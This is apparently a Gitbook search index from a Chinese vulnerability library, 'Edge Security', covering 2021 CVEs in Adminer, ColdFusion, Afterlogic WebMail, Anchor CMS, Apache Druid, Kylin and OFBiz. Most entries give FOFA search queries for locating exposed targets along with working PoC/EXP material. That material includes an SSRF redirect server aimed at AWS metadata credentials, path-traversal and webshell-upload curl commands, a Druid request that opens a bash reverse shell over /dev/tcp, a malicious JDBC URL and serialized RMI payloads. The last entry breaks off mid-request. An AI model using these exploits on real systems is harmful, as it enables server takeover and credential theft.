{"./":{"url":"./","title":"Introduction","keywords":"","body":"Vulnerability 纪念我们始终热爱的 来人皆是朋友 去人也不留 © Edge Security Team 本项目多数漏洞为互联网收集(多数均注明了原作者链接🔗,如有侵权请联系我们删除,谢谢),部分漏洞进行了复现。 如有引用请注明文章内原作者链接，谢谢！！！ 免责申明：项目所发布的资料\\FOFA搜索语法\\POC\\EXP仅用于安全研究！ Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-08-28 11:32:06 "},"Edge_Security/Adminer SSRF（CVE-2021-21311）.html":{"url":"Edge_Security/Adminer SSRF（CVE-2021-21311）.html","title":"Adminer SSRF（CVE-2021-21311）","keywords":"","body":"Adminer SSRF（CVE-2021-21311） 使用管理员发送任意get请求并从内部服务器检索JSON响应的方法。可以从AWS元数据服务中提取AWS访问密钥。 攻击步骤： 首先，启动一个python服务器，该服务器侦听传入的连接并以301重定向响应到任意选择的主机。在此示例情况下，重定向指向AWS元数据服务： http://169.254.169.254/latest/meta-data/instance-id 然后，在Adminer中使用Elasticsearch登录模块“登录”运行python代码的服务器，这导致Adminer从包含服务器的AWS实例ID的元数据服务器打印json响应。 重定向请求的python脚本： #!/usr/bin/env python import SimpleHTTPServer import SocketServer import sys import argparse def redirect_handler_factory(url): \"\"\" Returns a request handler class that redirects to supplied `url` \"\"\" class RedirectHandler(SimpleHTTPServer.SimpleHTTPRequestHandler): def do_GET(self): self.send_response(301) self.send_header('Location', url) self.end_headers() def do_POST(self): self.send_response(301) self.send_header('Location', url) self.end_headers() return RedirectHandler def main(): parser = argparse.ArgumentParser(description='HTTP redirect server') parser.add_argument('--port', '-p', action=\"store\", type=int, default=80, help='port to listen on') parser.add_argument('--ip', '-i', action=\"store\", default=\"\", help='host interface to listen on') parser.add_argument('redirect_url', action=\"store\") myargs = parser.parse_args() redirect_url = myargs.redirect_url port = myargs.port host = myargs.ip redirectHandler = redirect_handler_factory(redirect_url) handler = SocketServer.TCPServer((host, port), redirectHandler) print(\"serving at port %s\" % port) handler.serve_forever() if __name__ == \"__main__\": main() http://169.254.169.254/latest/meta-data/iam/security-credentials/ //列出服务器的可用角色。 ref： https://github.com/advisories/GHSA-x5r2-hj5c-8jx6 https://gist.github.com/bpsizemore/227141941c5075d96a34e375c63ae3bd Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Adobe ColdFusion 远程代码执行漏洞（CVE-2021-21087）.html":{"url":"Edge_Security/Adobe ColdFusion 远程代码执行漏洞（CVE-2021-21087）.html","title":"Adobe ColdFusion 远程代码执行漏洞（CVE-2021-21087）","keywords":"","body":"Adobe ColdFusion 远程代码执行漏洞（CVE-2021-21087） Adobe ColdFusion是一个快速应用程序开发平台。。Adobe ColdFusion 存在远程代码执行漏洞，由于过滤不严，未经授权的攻击者可构造恶意请求，造成任意代码执行，控制服务器。建议相关用户尽快采取安全措施阻止漏洞攻击。 影响范围 Adobe ColdFusion 2021 Adobe ColdFusion 2018 Adobe ColdFusion 2016 FOFA： app=\"Adobe-ColdFusion\" PoC： - method: GET path: - \"{{BaseURL}}/cf_scripts/scripts/ajax/package/cfajax.js\" - \"{{BaseURL}}/cf-scripts/scripts/ajax/package/cfajax.js\" - \"{{BaseURL}}/CFIDE/scripts/ajax/package/cfajax.js\" - \"{{BaseURL}}/cfide/scripts/ajax/package/cfajax.js\" - \"{{BaseURL}}/CF_SFSD/scripts/ajax/package/cfajax.js\" - \"{{BaseURL}}/cfide-scripts/ajax/package/cfajax.js\" - \"{{BaseURL}}/cfmx/CFIDE/scripts/ajax/package/cfajax.js\" regex: - 'eval\\(\\\"\\(\\\"\\+json\\+\\\"\\)\\\"\\)' ref： https://nosec.org/home/detail/4707.html https://github.com/projectdiscovery/nuclei-templates/pull/1128/files https://helpx.adobe.com/security/products/coldfusion/apsb21-16.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Afterlogic Aurora & WebMail Pro 任意文件读取（CVE-2021-26294）.html":{"url":"Edge_Security/Afterlogic Aurora & WebMail Pro 任意文件读取（CVE-2021-26294）.html","title":"Afterlogic Aurora & WebMail Pro 任意文件读取（CVE-2021-26294）","keywords":"","body":"Afterlogic Aurora & WebMail Pro 任意文件读取（CVE-2021-26294） 攻击者可以通过caldav_public_user@localhost用户登录，不需要其它用户信息就可以读取配置文件从而获得敏感信息。 影响版本： WebMail Pro ≤ 7.7.9 Afterlogic Aurora ≤ 7.7.9 PoC： curl -u 'caldav_public_user@localhost:caldav_public_user' \"https://sample-mail.tld/dav/server.php/files/personal/%2e%2e/%2e%2e//%2e%2e//%2e%2e/data/settings/settings.xml\" ref： http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26294 https://github.com/E3SEC/AfterLogic/blob/main/CVE-2021-26294-exposure-of-sensitive-information-vulnerability.md https://forum.ywhack.com/thread-115326-1-8.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Afterlogic Aurora & WebMail Pro 文件上传漏洞（CVE-2021-26293）.html":{"url":"Edge_Security/Afterlogic Aurora & WebMail Pro 文件上传漏洞（CVE-2021-26293）.html","title":"Afterlogic Aurora & WebMail Pro 文件上传漏洞（CVE-2021-26293）","keywords":"","body":"Afterlogic Aurora & WebMail Pro 文件上传漏洞（CVE-2021-26293） 该漏洞是由于Afterlogic Aurora & WebMail Pro中对上传的文件过滤和限制存在缺陷，攻击者可以通过上传恶意文件，从而执行任意代码。 影响版本： WebMail Pro ≤ 7.7.9 Afterlogic Aurora ≤ 7.7.9 PoC： curl -T shell.php -u 'caldav_public_user@localhost:caldav_public_user' \"https://sample-mail.tld/dav/server.php/files/persona/%2e%2e/%2e%2e//%2e%2e//%2e%2e/data//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e//%2e%2e/var/www/html/shell.php\" 默认路径为/var/www/html，也可能更改配置为其它路径，可以尝试其它方式获取。 curl -X DELETE -u 'caldav_public_user@localhost:caldav_public_user' \"https://sample-mail.tld/dav/server.php/files/personal/GIVE_ME_ERROR_TO_GET_DOC_ROOT_2021\" //使用无效路径获取SabreDAV错误查看Webroot路径 ref： http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26293 https://github.com/E3SEC/AfterLogic/blob/main/CVE-2021-26293-rce-via-public-unrestricted-file-upload-vulnerability.md https://forum.ywhack.com/thread-115325-1-8.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Anchor CMS 0.12.7 跨站请求伪造（CVE-2020-23342）.html":{"url":"Edge_Security/Anchor CMS 0.12.7 跨站请求伪造（CVE-2020-23342）.html","title":"Anchor CMS 0.12.7 跨站请求伪造（CVE-2020-23342）","keywords":"","body":"Anchor CMS 0.12.7 跨站请求伪造（CVE-2020-23342） FOFA: \"Anchor CMS\" && body=\"themes/default/img/favicon.png\" PoC： Anchor CMS使用Get方法进行敏感操作，可以使用exploit.html进行删除用户等操作。 exploit.html： 当管理员点击时删除ID为21的用户。 ref： https://packetstormsecurity.com/files/161048/anchorcms0127-xsrf.txt Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Apache Druid 远程代码执行漏洞（CVE-2021-25646）.html":{"url":"Edge_Security/Apache Druid 远程代码执行漏洞（CVE-2021-25646）.html","title":"Apache Druid 远程代码执行漏洞（CVE-2021-25646）","keywords":"","body":"Apache Druid 远程代码执行漏洞（CVE-2021-25646） 由于Apache Druid能够执行嵌入在各种类型的请求中的用户提供的JavaScript代码，经过身份认证的攻击者可以构造恶意请求，使用当前Druid权限在目标系统上执行任意代码。 昨天看错了..以为是阿里的Druid... 受影响版本 Apache Druid docker环境：https://github.com/apache/druid/tree/master/distribution/docker 安装教程可以见：https://druid.apache.org/docs/latest/tutorials/index.html FOFA: title=\"Apache\"&&title=\"Druid\" body=\"Apache Druid console\" 分析可以见：https://mp.weixin.qq.com/s/McAoLfyf_tgFIfGTAoRCiw EXP： POST /druid/indexer/v1/sampler?for=filter HTTP/1.1 Host: 127.0.0.1:8888 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:84.0) Gecko/20100101 Firefox/84.0 Accept: application/json, text/plain, */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/json;charset=utf-8 Content-Length: 10259 Origin: http://127.0.0.1:8888 Connection: close Referer: http://127.0.0.1:8888/unified-console.html Cookie: SESS12ca17b49af2289436f303e0166030a2=IbnbPIOtDzvyq8wYXho7mUGfyoawhdgPvMVszZDBfCI {\"type\":\"index\",\"spec\":{\"ioConfig\":{\"type\":\"index\",\"inputSource\":{\"type\":\"inline\",\"data\":\"{\\\"time\\\":\\\"2015-09-12T00:46:58.771Z\\\",\\\"channel\\\":\\\"#en.wikipedia\\\",\\\"cityName\\\":null,\\\"comment\\\":\\\"added project\\\",\\\"countryIsoCode\\\":null,\\\"countryName\\\":null,\\\"isAnonymous\\\":false,\\\"isMinor\\\":false,\\\"isNew\\\":false,\\\"isRobot\\\":false,\\\"isUnpatrolled\\\":false,\\\"metroCode\\\":null,\\\"namespace\\\":\\\"Talk\\\",\\\"page\\\":\\\"Talk:Oswald Tilghman\\\",\\\"regionIsoCode\\\":null,\\\"regionName\\\":null,\\\"user\\\":\\\"GELongstreet\\\",\\\"delta\\\":36,\\\"added\\\":36,\\\"deleted\\\":0}\\n{\\\"time\\\":\\\"2015-09-12T00:47:00.496Z\\\",\\\"channel\\\":\\\"#ca.wikipedia\\\",\\\"cityName\\\":null,\\\"comment\\\":\\\"Robot inserta {{Commonscat}} que enllaça amb [[commons:category:Rallicula]]\\\",\\\"countryIsoCode\\\":null,\\\"countryName\\\":null,\\\"isAnonymous\\\":false,\\\"isMinor\\\":true,\\\"isNew\\\":false,\\\"isRobot\\\":true,\\\"isUnpatrolled\\\":false,\\\"metroCode\\\":null,\\\"namespace\\\":\\\"Main\\\",\\\"page\\\":\\\"Rallicula\\\",\\\"regionIsoCode\\\":null,\\\"regionName\\\":null,\\\"user\\\":\\\"PereBot\\\",\\\"delta\\\":17,\\\"added\\\":17,\\\"deleted\\\":0}\\n{\\\"time\\\":\\\"2015-09-12T00:47:05.474Z\\\",\\\"channel\\\":\\\"#en.wikipedia\\\",\\\"cityName\\\":\\\"Auburn\\\",\\\"comment\\\":\\\"/* Status of peremptory norms under international law */ fixed spelling of 'Wimbledon'\\\",\\\"countryIsoCode\\\":\\\"AU\\\",\\\"countryName\\\":\\\"Australia\\\",\\\"isAnonymous\\\":true,\\\"isMinor\\\":false,\\\"isNew\\\":false,\\\"isRobot\\\":false,\\\"isUnpatrolled\\\":false,\\\"metroCode\\\":null,\\\"namespace\\\":\\\"Main\\\",\\\"page\\\":\\\"Peremptory norm\\\",\\\"regionIsoCode\\\":\\\"NSW\\\",\\\"regionName\\\":\\\"New South Wales\\\",\\\"user\\\":\\\"60.225.66.142\\\",\\\"delta\\\":0,\\\"added\\\":0,\\\"deleted\\\":0}\\n{\\\"time\\\":\\\"2015-09-12T00:47:08.770Z\\\",\\\"channel\\\":\\\"#vi.wikipedia\\\",\\\"cityName\\\":null,\\\"comment\\\":\\\"fix Lỗi CS1: ngày tháng\\\",\\\"countryIsoCode\\\":null,\\\"countryName\\\":null,\\\"isAnonymous\\\":false,\\\"isMinor\\\":true,\\\"isNew\\\":false,\\\"isRobot\\\":true,\\\"isUnpatrolled\\\":false,\\\"metroCode\\\":null,\\\"namespace\\\":\\\"Main\\\",\\\"page\\\":\\\"Apamea abruzzorum\\\",\\\"regionIsoCode\\\":null,\\\"regionName\\\":null,\\\"user\\\":\\\"Cheers!-bot\\\",\\\"delta\\\":18,\\\"added\\\":18,\\\"deleted\\\":0}\\n{\\\"time\\\":\\\"2015-09-12T00:47:11.862Z\\\",\\\"channel\\\":\\\"#vi.wikipedia\\\",\\\"cityName\\\":null,\\\"comment\\\":\\\"clean up using [[Project:AWB|AWB]]\\\",\\\"countryIsoCode\\\":null,\\\"countryName\\\":null,\\\"isAnonymous\\\":false,\\\"isMinor\\\":false,\\\"isNew\\\":false,\\\"isRobot\\\":true,\\\"isUnpatrolled\\\":false,\\\"metroCode\\\":null,\\\"namespace\\\":\\\"Main\\\",\\\"page\\\":\\\"Atractus flammigerus\\\",\\\"regionIsoCode\\\":null,\\\"regionName\\\":null,\\\"user\\\":\\\"ThitxongkhoiAWB\\\",\\\"delta\\\":18,\\\"added\\\":18,\\\"deleted\\\":0}\\n{\\\"time\\\":\\\"2015-09-12T00:47:13.987Z\\\",\\\"channel\\\":\\\"#vi.wikipedia\\\",\\\"cityName\\\":null,\\\"comment\\\":\\\"clean up using [[Project:AWB|AWB]]\\\",\\\"countryIsoCode\\\":null,\\\"countryName\\\":null,\\\"isAnonymous\\\":false,\\\"isMinor\\\":false,\\\"isNew\\\":false,\\\"isRobot\\\":true,\\\"isUnpatrolled\\\":false,\\\"metroCode\\\":null,\\\"namespace\\\":\\\"Main\\\",\\\"page\\\":\\\"Agama mossambica\\\",\\\"regionIsoCode\\\":null,\\\"regionName\\\":null,\\\"user\\\":\\\"ThitxongkhoiAWB\\\",\\\"delta\\\":18,\\\"added\\\":18,\\\"deleted\\\":0}\\n{\\\"time\\\":\\\"2015-09-12T00:47:17.009Z\\\",\\\"channel\\\":\\\"#ca.wikipedia\\\",\\\"cityName\\\":null,\\\"comment\\\":\\\"/* Imperi Austrohongarès */\\\",\\\"countryIsoCode\\\":null,\\\"countryName\\\":null,\\\"isAnonymous\\\":false,\\\"isMinor\\\":false,\\\"isNew\\\":false,\\\"isRobot\\\":false,\\\"isUnpatrolled\\\":false,\\\"metroCode\\\":null,\\\"namespace\\\":\\\"Main\\\",\\\"page\\\":\\\"Campanya dels Balcans (1914-1918)\\\",\\\"regionIsoCode\\\":null,\\\"regionName\\\":null,\\\"user\\\":\\\"Jaumellecha\\\",\\\"delta\\\":-20,\\\"added\\\":0,\\\"deleted\\\":20}\\n{\\\"time\\\":\\\"2015-09-12T00:47:19.591Z\\\",\\\"channel\\\":\\\"#en.wikipedia\\\",\\\"cityName\\\":null,\\\"comment\\\":\\\"adding comment on notability and possible COI\\\",\\\"countryIsoCode\\\":null,\\\"countryName\\\":null,\\\"isAnonymous\\\":false,\\\"isMinor\\\":false,\\\"isNew\\\":true,\\\"isRobot\\\":false,\\\"isUnpatrolled\\\":true,\\\"metroCode\\\":null,\\\"namespace\\\":\\\"Talk\\\",\\\"page\\\":\\\"Talk:Dani Ploeger\\\",\\\"regionIsoCode\\\":null,\\\"regionName\\\":null,\\\"user\\\":\\\"New Media Theorist\\\",\\\"delta\\\":345,\\\"added\\\":345,\\\"deleted\\\":0}\\n{\\\"time\\\":\\\"2015-09-12T00:47:21.578Z\\\",\\\"channel\\\":\\\"#en.wikipedia\\\",\\\"cityName\\\":null,\\\"comment\\\":\\\"Copying assessment table to wiki\\\",\\\"countryIsoCode\\\":null,\\\"countryName\\\":null,\\\"isAnonymous\\\":false,\\\"isMinor\\\":false,\\\"isNew\\\":false,\\\"isRobot\\\":true,\\\"isUnpatrolled\\\":false,\\\"metroCode\\\":null,\\\"namespace\\\":\\\"User\\\",\\\"page\\\":\\\"User:WP 1.0 bot/Tables/Project/Pubs\\\",\\\"regionIsoCode\\\":null,\\\"regionName\\\":null,\\\"user\\\":\\\"WP 1.0 bot\\\",\\\"delta\\\":121,\\\"added\\\":121,\\\"deleted\\\":0}\\n{\\\"time\\\":\\\"2015-09-12T00:47:25.821Z\\\",\\\"channel\\\":\\\"#vi.wikipedia\\\",\\\"cityName\\\":null,\\\"comment\\\":\\\"clean up using [[Project:AWB|AWB]]\\\",\\\"countryIsoCode\\\":null,\\\"countryName\\\":null,\\\"isAnonymous\\\":false,\\\"isMinor\\\":false,\\\"isNew\\\":false,\\\"isRobot\\\":true,\\\"isUnpatrolled\\\":false,\\\"metroCode\\\":null,\\\"namespace\\\":\\\"Main\\\",\\\"page\\\":\\\"Agama persimilis\\\",\\\"regionIsoCode\\\":null,\\\"regionName\\\":null,\\\"user\\\":\\\"ThitxongkhoiAWB\\\",\\\"delta\\\":18,\\\"added\\\":18,\\\"deleted\\\":0}\\n{\\\"time\\\":\\\"2015-09-12T00:47:29.913Z\\\",\\\"channel\\\":\\\"#en.wikipedia\\\",\\\"cityName\\\":null,\\\"comment\\\":\\\"Blank stale warning(s) and replace with {{[[template:OW|OW]]}} using [[Project:AWB|AWB]]\\\",\\\"countryIsoCode\\\":null,\\\"countryName\\\":null,\\\"isAnonymous\\\":false,\\\"isMinor\\\":true,\\\"isNew\\\":false,\\\"isRobot\\\":false,\\\"isUnpatrolled\\\":false,\\\"metroCode\\\":null,\\\"namespace\\\":\\\"User talk\\\",\\\"page\\\":\\\"User talk:161.184.95.17\\\",\\\"regionIsoCode\\\":null,\\\"regionName\\\":null,\\\"user\\\":\\\"DavidLeighEllis\\\",\\\"delta\\\":0,\\\"added\\\":0,\\\"deleted\\\":0}\\n{\\\"time\\\":\\\"2015-09-12T00:47:33.004Z\\\",\\\"channel\\\":\\\"#vi.wikipedia\\\",\\\"cityName\\\":null,\\\"comment\\\":\\\"clean up using [[Project:AWB|AWB]]\\\",\\\"countryIsoCode\\\":null,\\\"countryName\\\":null,\\\"isAnonymous\\\":false,\\\"isMinor\\\":false,\\\"isNew\\\":false,\\\"isRobot\\\":true,\\\"isUnpatrolled\\\":false,\\\"metroCode\\\":null,\\\"namespace\\\":\\\"Main\\\",\\\"page\\\":\\\"Atractus edioi\\\",\\\"regionIsoCode\\\":null,\\\"regionName\\\":null,\\\"user\\\":\\\"ThitxongkhoiAWB\\\",\\\"delta\\\":18,\\\"added\\\":18,\\\"deleted\\\":0}\\n{\\\"time\\\":\\\"2015-09-12T00:47:35.776Z\\\",\\\"channel\\\":\\\"#vi.wikipedia\\\",\\\"cityName\\\":null,\\\"comment\\\":\\\"Lỗi CS1: ngày tháng\\\",\\\"countryIsoCode\\\":null,\\\"countryName\\\":null,\\\"isAnonymous\\\":false,\\\"isMinor\\\":true,\\\"isNew\\\":false,\\\"isRobot\\\":true,\\\"isUnpatrolled\\\":false,\\\"metroCode\\\":null,\\\"namespace\\\":\\\"Main\\\",\\\"page\\\":\\\"Agave gentryi\\\",\\\"regionIsoCode\\\":null,\\\"regionName\\\":null,\\\"user\\\":\\\"TuHan-Bot\\\",\\\"delta\\\":36,\\\"added\\\":36,\\\"deleted\\\":0}\\n{\\\"time\\\":\\\"2015-09-12T00:47:37.881Z\\\",\\\"channel\\\":\\\"#vi.wikipedia\\\",\\\"cityName\\\":null,\\\"comment\\\":\\\"clean up using [[Project:AWB|AWB]]\\\",\\\"countryIsoCode\\\":null,\\\"countryName\\\":null,\\\"isAnonymous\\\":false,\\\"isMinor\\\":false,\\\"isNew\\\":false,\\\"isRobot\\\":true,\\\"isUnpatrolled\\\":false,\\\"metroCode\\\":null,\\\"namespace\\\":\\\"Main\\\",\\\"page\\\":\\\"Agama sankaranica\\\",\\\"regionIsoCode\\\":null,\\\"regionName\\\":null,\\\"user\\\":\\\"ThitxongkhoiAWB\\\",\\\"delta\\\":18,\\\"added\\\":18,\\\"deleted\\\":0}\\n{\\\"time\\\":\\\"2015-09-12T00:47:42.090Z\\\",\\\"channel\\\":\\\"#vi.wikipedia\\\",\\\"cityName\\\":null,\\\"comment\\\":\\\"fix Lỗi CS1: ngày tháng\\\",\\\"countryIsoCode\\\":null,\\\"countryName\\\":null,\\\"isAnonymous\\\":false,\\\"isMinor\\\":true,\\\"isNew\\\":false,\\\"isRobot\\\":true,\\\"isUnpatrolled\\\":false,\\\"metroCode\\\":null,\\\"namespace\\\":\\\"Main\\\",\\\"page\\\":\\\"Apamea albertae\\\",\\\"regionIsoCode\\\":null,\\\"regionName\\\":null,\\\"user\\\":\\\"Cheers!-bot\\\",\\\"delta\\\":18,\\\"added\\\":18,\\\"deleted\\\":0}\\n{\\\"time\\\":\\\"2015-09-12T00:47:44.963Z\\\",\\\"channel\\\":\\\"#ru.wikipedia\\\",\\\"cityName\\\":null,\\\"comment\\\":\\\"/* Донецкая Народная Республика */\\\",\\\"countryIsoCode\\\":null,\\\"countryName\\\":null,\\\"isAnonymous\\\":false,\\\"isMinor\\\":false,\\\"isNew\\\":false,\\\"isRobot\\\":false,\\\"isUnpatrolled\\\":false,\\\"metroCode\\\":null,\\\"namespace\\\":\\\"Main\\\",\\\"page\\\":\\\"Караман, Александр Акимович\\\",\\\"regionIsoCode\\\":null,\\\"regionName\\\":null,\\\"user\\\":\\\"Камарад Че\\\",\\\"delta\\\":0,\\\"added\\\":0,\\\"deleted\\\":0}\\n{\\\"time\\\":\\\"2015-09-12T00:47:47.870Z\\\",\\\"channel\\\":\\\"#vi.wikipedia\\\",\\\"cityName\\\":null,\\\"comment\\\":\\\"clean up using [[Project:AWB|AWB]]\\\",\\\"countryIsoCode\\\":null,\\\"countryName\\\":null,\\\"isAnonymous\\\":false,\\\"isMinor\\\":false,\\\"isNew\\\":false,\\\"isRobot\\\":true,\\\"isUnpatrolled\\\":false,\\\"metroCode\\\":null,\\\"namespace\\\":\\\"Main\\\",\\\"page\\\":\\\"Atractus duboisi\\\",\\\"regionIsoCode\\\":null,\\\"regionName\\\":null,\\\"user\\\":\\\"ThitxongkhoiAWB\\\",\\\"delta\\\":18,\\\"added\\\":18,\\\"deleted\\\":0}\\n{\\\"time\\\":\\\"2015-09-12T00:47:50.819Z\\\",\\\"channel\\\":\\\"#en.wikipedia\\\",\\\"cityName\\\":null,\\\"comment\\\":\\\"/* Films */\\\",\\\"countryIsoCode\\\":null,\\\"countryName\\\":null,\\\"isAnonymous\\\":false,\\\"isMinor\\\":false,\\\"isNew\\\":false,\\\"isRobot\\\":false,\\\"isUnpatrolled\\\":false,\\\"metroCode\\\":null,\\\"namespace\\\":\\\"Main\\\",\\\"page\\\":\\\"Keiynan Lonsdale\\\",\\\"regionIsoCode\\\":null,\\\"regionName\\\":null,\\\"user\\\":\\\"Lg16spears\\\",\\\"delta\\\":-11,\\\"added\\\":0,\\\"deleted\\\":11}\\n{\\\"time\\\":\\\"2015-09-12T00:47:53.259Z\\\",\\\"channel\\\":\\\"#ja.wikipedia\\\",\\\"cityName\\\":null,\\\"comment\\\":\\\"/* 対戦通算成績と得失点 */\\\",\\\"countryIsoCode\\\":null,\\\"countryName\\\":null,\\\"isAnonymous\\\":false,\\\"isMinor\\\":true,\\\"isNew\\\":false,\\\"isRobot\\\":false,\\\"isUnpatrolled\\\":false,\\\"metroCode\\\":null,\\\"namespace\\\":\\\"Main\\\",\\\"page\\\":\\\"アルビレックス新潟の年度別成績一覧\\\",\\\"regionIsoCode\\\":null,\\\"regionName\\\":null,\\\"user\\\":\\\"BlueMoon2662\\\",\\\"delta\\\":14,\\\"added\\\":14,\\\"deleted\\\":0}\\n{\\\"time\\\":\\\"2015-09-12T00:47:56.126Z\\\",\\\"channel\\\":\\\"#en.wikipedia\\\",\\\"cityName\\\":null,\\\"comment\\\":\\\"Bot updating unblock request table ([[en:WP:PEACHY|Peachy 2.0 (alpha 8)]])\\\",\\\"countryIsoCode\\\":null,\\\"countryName\\\":null,\\\"isAnonymous\\\":false,\\\"isMinor\\\":false,\\\"isNew\\\":false,\\\"isRobot\\\":true,\\\"isUnpatrolled\\\":false,\\\"metroCode\\\":null,\\\"namespace\\\":\\\"User\\\",\\\"page\\\":\\\"User:Cyberbot I/Requests for unblock report\\\",\\\"regionIsoCode\\\":null,\\\"regionName\\\":null,\\\"user\\\":\\\"Cyberbot I\\\",\\\"delta\\\":-74,\\\"added\\\":0,\\\"deleted\\\":74}\"},\"inputFormat\":{\"type\":\"json\",\"keepNullColumns\":true}},\"dataSchema\":{\"dataSource\":\"sample\",\"timestampSpec\":{\"column\":\"!!!_no_such_column_!!!\",\"missingValue\":\"1970-01-01T00:00:00Z\"},\"dimensionsSpec\":{},\"transformSpec\":{\"transforms\":[],\"filter\":{\"type\": \"javascript\", \"function\": \"function(value){return java.lang.Runtime.getRuntime().exec('/bin/bash -i > /dev/tcp/127.0.0.1/8080 0&1')}\", \"dimension\": \"added\", \"\": { \"enabled\": \"true\" } } } },\"type\":\"index\",\"tuningConfig\":{\"type\":\"index\"}},\"samplerConfig\":{\"numRows\":500,\"timeoutMs\":15000}} ref: https://github.com/apache/druid/issues/2434 https://forum.ywhack.com/thread-115083-1-1.html https://druid.apache.org/docs/latest/operations/api-reference.html#broker https://lists.apache.org/thread.html/r20e0c3b10ae2c05a3aad40f1476713c45bdefc32c920b9986b941d8f@%3Cannounce.apache.org%3E https://www.o2oxy.cn/3090.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Apache Druid 远程代码执行漏洞（CVE-2021-26919）.html":{"url":"Edge_Security/Apache Druid 远程代码执行漏洞（CVE-2021-26919）.html","title":"Apache Druid 远程代码执行漏洞（CVE-2021-26919）","keywords":"","body":"Apache Druid 远程代码执行漏洞（CVE-2021-26919） Apache Druid 是用Java编写的面向列的开源分布式数据存储，旨在快速获取大量事件数据，并在数据之上提供低延迟查询。2021年3月30日，Apache Druid官方发布安全更新，修复了 CVE-2021-26919 Apache Druid 远程代码执行漏洞。由于Apache Druid 默认情况下缺乏授权认证，攻击者可直接构造恶意请求执行任意代码，控制服务器。 影响版本 Apache Druid jdbc触发点：https://druid.apache.org/docs/0.19.0/development/extensions-core/druid-lookups.html#polling-lookup poc: url = \"jdbc:mysql://localhost:3307/?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&maxAllowedPacket=65535\" user =\"cb1\" password=\"password\" ref： http://m0d9.me/2021/04/21/Apache-Druid-CVE-2021-26919-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/ https://help.aliyun.com/noticelist/articleid/1060822985.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Apache Kylin API未授权访问漏洞（CVE-2020-13937）.html":{"url":"Edge_Security/Apache Kylin API未授权访问漏洞（CVE-2020-13937）.html","title":"Apache Kylin API未授权访问漏洞（CVE-2020-13937）","keywords":"","body":"Apache Kylin API未授权访问漏洞（CVE-2020-13937） fofa:title=\"Kylin\" 预警通告：https://help.aliyun.com/noticelist/articleid/1060733129.html PoC： http://xx.com/kylin/api/admin/config Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Apache OFBiz RMI Bypass RCE（CVE-2021-29200）.html":{"url":"Edge_Security/Apache OFBiz RMI Bypass RCE（CVE-2021-29200）.html","title":"Apache OFBiz RMI Bypass RCE（CVE-2021-29200）","keywords":"","body":"Apache OFBiz RMI Bypass RCE（CVE-2021-29200） 由于Apache OFBiz存在Java RMI反序列化漏洞，未经身份验证的用户可以执行RCE攻击，导致服务器被接管。 影响版本： Apache OFBiz 详细分析可以见：https://mp.weixin.qq.com/s/vM0pXZ5mhusFBsj1xD-2zw poc： POST /webtools/control/SOAPService HTTP/1.1 Host: xxx User-Agent: python-requests/2.24.0 Accept-Encoding: gzip, deflate Accept: */* Connection: close Content-Type: text/xml Content-Length: 877 ACED0005737200326A617661782E6D616E6167656D656E742E72656D6F74652E726D692E524D49436F6E6E656374696F6E496D706C5F5374756200000000000000020200007872001A6A6176612E726D692E7365727665722E52656D6F746553747562ECC98BE1651A0200007872001C6A6176612E726D692E7365727665722E52656D6F74654F626A656374D361B4910C61331E03000078707738000A556E6963617374526566000F3130342E3135362E3233312E3135300000270FFFFFFFFFEF34D1DB00000000000000000000000000000078 poc.py：https://github.com/r0ckysec/CVE-2021-29200 ref: https://github.com/r0ckysec/CVE-2021-29200 https://mp.weixin.qq.com/s/vM0pXZ5mhusFBsj1xD-2zw https://xz.aliyun.com/t/9556 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Apache OFBiz RMI反序列化任意代码执行（CVE-2021-26295）.html":{"url":"Edge_Security/Apache OFBiz RMI反序列化任意代码执行（CVE-2021-26295）.html","title":"Apache OFBiz RMI反序列化任意代码执行（CVE-2021-26295）","keywords":"","body":"Apache OFBiz RMI反序列化任意代码执行（CVE-2021-26295） Apache OFBiz是一个电子商务平台，用于构建大中型企业级、跨平台、跨数据库、跨应用服务器的多层、分布式电子商务类应用系统。2021年3月22日 Apache OFBiz官方发布安全更新，修复了一处由RMI反序列化造成的远程代码执行漏洞。攻击者可构造恶意请求，触发反序列化，从而造成任意代码执行，控制服务器. 影响版本： Apache OFBiz java -jar ysoserial.jar URLDNS http://kzjtft.dnslog.cn >1.ot import binascii filename = '1.ot' with open(filename, 'rb') as f: content = f.read() print(binascii.hexlify(content)) poc: GET /webtools/control/SOAPService HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:86.0) Gecko/20100101 Firefox/86.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Content-Length: 836 